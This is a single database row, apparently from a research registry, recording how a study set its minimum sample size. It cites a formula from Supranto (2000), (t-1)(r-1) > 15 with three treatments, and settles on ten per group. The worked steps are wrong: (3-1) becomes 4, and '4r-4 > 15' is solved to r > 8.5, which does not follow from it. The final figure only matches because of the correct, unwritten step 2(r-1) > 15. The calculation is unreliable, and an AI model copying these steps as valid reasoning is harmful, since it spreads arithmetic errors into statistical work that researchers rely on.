	(9473,256,'sample_size_calculation_details','\"Determination of the minimum sample using the formula (Supranto, J. (2000). Teknik Sampling Untuk Survei &amp; Eksprimen.), with the equation = (t-1) (r-1) &gt; 15.\\nt= treatment\\nr= replication\\n\\nt in this study is 3, then =\\n(3-1) (r-1) &gt;15\\n4(r-1) &gt;15\\n4r-4&gt;15\\nr&gt;8.5\\n\\nSo the minimum sample for each group is &gt;8.5. So the researcher chose 10.\"','2022-03-31 13:24:01','2022-03-31 13:24:01'),
